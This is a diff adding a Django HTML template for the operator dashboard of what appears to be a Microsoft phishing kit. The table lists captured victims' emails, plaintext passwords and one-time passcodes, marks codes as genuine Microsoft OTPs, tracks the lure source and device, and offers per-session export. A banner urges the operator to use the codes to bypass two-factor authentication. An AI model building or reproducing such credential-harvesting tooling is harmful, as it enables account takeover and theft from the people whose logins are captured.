@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>All Sessions</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;padding:30px 20px}
+        .container{max-width:1400px;margin:0 auto}
+        .header{display:flex;justify-content:space-between;align-items:center;background:#fff;padding:20px 30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);margin-bottom:20px}
+        .header h1{font-size:24px}
+        .stat-badge{background:#e8f0fe;padding:6px 18px;border-radius:20px;font-size:14px;color:#0067b8;font-weight:600}
+        .link{color:#0067b8;text-decoration:none}
+        .link:hover{text-decoration:underline}
+        .card{background:#fff;border-radius:8px;padding:25px;box-shadow:0 2px 10px rgba(0,0,0,0.1);overflow-x:auto}
+        table{width:100%;border-collapse:collapse;font-size:13px}
+        thead{background:#f8f9fa}
+        th{padding:10px 12px;text-align:left;font-weight:600;border-bottom:2px solid #dee2e6}
+        td{padding:10px 12px;border-bottom:1px solid #e5e5e5}
+        tr:hover{background:#f8f9fa}
+        .badge{display:inline-block;padding:2px 10px;border-radius:12px;font-size:11px;font-weight:600}
+        .badge-otp{background:#d4edda;color:#155724;font-weight:bold;font-size:14px}
+        .badge-real{background:#28a745;color:#fff}
+        .badge-source{background:#e8f0fe;color:#0067b8}
+        .btn-export{padding:4px 12px;background:#0067b8;color:#fff;border:none;border-radius:4px;font-size:12px;cursor:pointer;text-decoration:none;display:inline-block}
+        .btn-export:hover{background:#004d8c}
+        .session-id{font-family:monospace;font-size:11px;color:#666}
+        .credentials .email{font-weight:600;color:#0067b8}
+        .credentials .password{font-family:monospace;color:#dc3545}
+        .timestamp{font-size:11px;color:#666}
+        .alert{background:#f8d7da;color:#721c24;padding:10px 15px;border-radius:4px;margin-bottom:15px;border:1px solid #f5c6cb}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Captured Sessions</h1>
+            <div><span class="stat-badge">Total: {{ total_sessions }}</span> <a href="{% url 'accounts:dashboard' %}" class="link">← Back</a></div>
+        </div>
+        <div class="alert">
+            🚨 <strong>REAL MICROSOFT OTPs CAPTURED!</strong> Use them to bypass 2FA!
+        </div>
+        <div class="card">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Session</th>
+                        <th>📧 Email</th>
+                        <th>🔑 Password</th>
+                        <th>🔢 OTP</th>
+                        <th>✅ Real MS</th>
+                        <th>Source</th>
+                        <th>Device</th>
+                        <th>Time</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for session in sessions %}
+                    <tr>
+                        <td><div class="session-id">{{ session.session_id|truncatechars:12 }}</div></td>
+                        <td><strong style="color:#0067b8;">{{ session.email|default:"N/A" }}</strong></td>
+                        <td><span style="font-family:monospace;color:#dc3545;">{{ session.password|default:"N/A" }}</span></td>
+                        <td><span class="badge badge-otp">{{ session.otp_code|default:"N/A" }}</span></td>
+                        <td>{% if session.otp_from_microsoft %}<span class="badge badge-real">✅ REAL</span>{% else %}❌{% endif %}</td>
+                        <td><span class="badge badge-source">{{ session.tracking_source|default:"Direct" }}</span></td>
+                        <td>{{ session.device_type|default:"N/A" }}</td>
+                        <td><div class="timestamp">{{ session.first_click|date:"M d, Y H:i" }}</div></td>
+                        <td><a href="{% url 'accounts:export_session' session.session_id %}" class="btn-export">📥 Export</a></td>
+                    </tr>
+                    {% empty %}
+                    <tr><td colspan="9" style="padding:40px;text-align:center;color:#999;">No sessions captured yet</td></tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</body>
+</html>
